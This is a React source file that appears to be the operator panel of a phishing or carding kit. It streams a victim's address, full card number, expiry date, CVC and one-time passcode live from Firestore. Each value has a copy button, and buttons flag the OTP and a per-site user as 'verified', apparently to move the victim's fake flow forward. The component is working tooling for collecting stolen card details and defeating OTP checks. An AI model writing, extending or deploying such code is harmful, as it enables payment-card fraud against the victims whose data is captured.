import styled from "@emotion/styled";
import { LoadingButton } from "@mui/lab";
import { Container } from "@mui/material";
import { doc, onSnapshot, setDoc } from "firebase/firestore";
import React, { useEffect, useState } from "react";
import CopyToClipboard from "react-copy-to-clipboard";
import { useParams } from "react-router-dom";
import { db } from "../config/firebase";

const ColorButton = styled(LoadingButton)(({ theme }) => ({
  fontSize: 16,
  textTransform: "none",
}));

function AllCardInfos() {
  let { docId } = useParams();
  const [isLaoding, setLoading] = useState(false);
  const [data, setData] = useState({
    address: "",
    country: "United Kingdom",
    city: "",
    state: "",
    zip: "",
    cardnumber: "",
    expiredate: "",
    cvc: "",
    site: "",
    passcode: "",
  });

  const dataArray = [
    { title: "Address", value: data.address },
    { title: "Country", value: data.country },
    { title: "City", value: data.city },
    { title: "State", value: data.state },
    { title: "Zip", value: data.zip },
    { title: "Card number", value: data.cardnumber },
    { title: "Expiry date", value: data.expiredate },
    { title: "Cvc", value: data.cvc },
    { title: "Otp", value: data.passcode },
  ];

  useEffect(() => {
    onSnapshot(doc(db(""), "cards", docId), (doc) => {
      // console.log("Current data: ", doc.data());
      if (doc.data()) setData(doc.data());
    });
  }, []);

  return (
    <Container style={{ marginTop: 40 }}>
      {dataArray.map((value, index) => (
        <div
          key={index}
          style={{ marginTop: 20 }}
          className="col-lg-6 col-sm-6"
        >
          <label htmlFor="cardNumber">{value.title}</label>
          <div className="input-group">
            <input
              type="text"
              className="form-control"
              defaultValue={value.value}
            />
            <span
              className="input-group-btn"
              style={{ verticalAlign: "baseline" }}
            >
              <CopyToClipboard
                text={value.value}
                onCopy={() => console.log(value.value)}
              >
                <button className="btn btn-default" type="button">
                  Copy
                </button>
              </CopyToClipboard>
            </span>
          </div>
        </div>
      ))}
      <div style={{ marginTop: 20 }} className="col-lg-6 col-sm-6">
        <ColorButton
          fullWidth
          variant="contained"
          color="success"
          loading={isLaoding}
          disableElevation
          onClick={() => {
            const cardRef = doc(db(""), "cards", docId);
            setLoading(true);
            setDoc(cardRef, { otpVerified: true }, { merge: true }).then(() => {
              setLoading(false);
              alert("otp Verifed");
            });
          }}
        >
          verify otp
        </ColorButton>
      </div>

      <div style={{ marginTop: 20 }} className="col-lg-6 col-sm-6">
        <ColorButton
          fullWidth
          variant="contained"
          color="primary"
          loading={isLaoding}
          disableElevation
          onClick={() => {
            const userRef = doc(db(data.site), "users", docId);
            setLoading(true);
            setDoc(userRef, { kycVerified: true }, { merge: true }).then(() => {
              setLoading(false);
              alert(`User Verifed`);
            });
          }}
        >
          {`Verify ${data.site} user`}
        </ColorButton>
      </div>
    </Container>
  );
}

export default AllCardInfos;
